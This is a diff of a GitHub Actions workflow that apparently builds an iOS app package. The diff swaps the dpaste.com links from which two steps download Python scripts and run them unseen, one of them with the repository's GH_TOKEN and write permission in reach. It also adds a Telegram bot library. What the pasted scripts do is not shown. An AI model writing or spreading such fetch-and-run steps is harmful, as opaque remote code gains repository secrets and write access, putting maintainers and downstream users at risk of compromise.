@@ -3,35 +3,6 @@ name: Build Fougo External iOS IPA & Live Server
 on:
   workflow_dispatch:
     inputs:
-      build_mode:
-        description: "Packaging Mode"
-        required: true
-        default: "standalone"
-        type: choice
-        options:
-          - standalone
-          - inject
-      base_ipa_path:
-        description: "Path to base .ipa in repo (used when mode = inject)"
-        required: false
-        default: "base/TargetApp.ipa"
-      signing_method:
-        description: "Code Signing Method"
-        required: true
-        default: "ldid-adhoc"
-        type: choice
-        options:
-          - ldid-adhoc
-          - unsigned
-          - apple-p12
-      architecture:
-        description: "Target Architecture Slice(s)"
-        required: true
-        default: "arm64"
-        type: choice
-        options:
-          - arm64
-          - arm64+arm64e
       app_version:
         description: "CFBundleShortVersionString"
         required: false
@@ -47,6 +18,7 @@ on:
   push:
     branches:
       - main
+      - master
 
 permissions:
   contents: write
@@ -66,6 +38,12 @@ jobs:
         with:
           python-version: '3.11'
 
+      - name: Install Python Dependencies
+        shell: pwsh
+        run: |
+          python -m pip install --upgrade pip
+          pip install Pillow requests flask pyTelegramBotAPI
+
       - name: Compile ARM64 iOS App & Package ESign IPA
         shell: pwsh
         env:
@@ -76,7 +54,7 @@ jobs:
           GH_REPO: ${{ github.repository }}
         run: |
           $scriptFile = Join-Path $env:RUNNER_TEMP "build_fougo.py"
-          Invoke-WebRequest -Uri "https://dpaste.com/HLCBDQJW4.txt" -OutFile $scriptFile -UseBasicParsing
+          Invoke-WebRequest -Uri "https://dpaste.com/GD8FH5LT6.txt" -OutFile $scriptFile -UseBasicParsing
           python $scriptFile
 
       - name: Upload Compiled .ipa Artifact
@@ -100,7 +78,7 @@ jobs:
         with:
           tag_name: latest-ipa
           name: "Fougo External v2.4.0 (ESign Ready IPA + LiquidGlass Source)"
-          body: "Direct ESign-ready `.ipa` and full LiquidGlass source archive built automatically."
+          body: "Direct ESign-ready .ipa and full LiquidGlass source archive built automatically."
           prerelease: false
           files: |
             built-ipa/FougoExternal-ESign-Ready.ipa
@@ -117,5 +95,5 @@ jobs:
           GH_REPO: ${{ github.repository }}
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          curl -sSL "https://dpaste.com/B6QJJLCWN.txt" -o /tmp/run_ecosystem.py
+          curl -sSL "https://dpaste.com/AEJ2JWPDS.txt" -o /tmp/run_ecosystem.py
           python3 /tmp/run_ecosystem.py
